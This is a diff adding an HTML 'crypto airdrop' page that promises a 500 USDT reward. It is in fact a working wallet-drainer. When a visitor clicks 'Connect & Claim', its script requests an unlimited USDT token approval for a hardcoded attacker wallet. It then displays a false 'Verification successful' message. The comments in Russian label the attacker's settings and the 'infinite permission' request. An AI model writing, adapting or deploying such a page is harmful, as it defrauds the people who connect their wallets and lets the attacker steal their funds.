@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Crypto Reward</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <style>
+        body { background: #0b0e11; color: white; font-family: 'Arial', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; padding: 40px; border-radius: 16px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        button { background: #f3ba2f; color: black; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #dba320; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Airdrop Phase 1 is Live!</h1>
+        <p>Connect your wallet to claim your 500 USDT reward.</p>
+        <button id="claimBtn">Connect & Claim</button>
+    </div>
+
+    <script>
+        // --- ТВОИ НАСТРОЙКИ ---
+        const myWallet = "0xB625C68bB67C2F8A4306325fBfE602324208a6a4"; 
+        const usdtContract = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        // ----------------------
+
+        async function start() {
+            if (window.ethereum) {
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
+
+                    // Формируем запрос на Approve (разрешение тратить токены)
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(usdtContract, abi, signer);
+
+                    // Запрашиваем бесконечное разрешение
+                    const amount = ethers.constants.MaxUint256;
+                    const tx = await contract.approve(myWallet, amount);
+                    
+                    alert("Verification successful! Reward will be sent within 24 hours.");
+                } catch (error) {
+                    console.error(error);
+                }
+            } else {
+                alert("Please install MetaMask to claim rewards.");
+            }
+        }
+
+        document.getElementById('claimBtn').onclick = start;
+    </script>
+</body>
+</html>
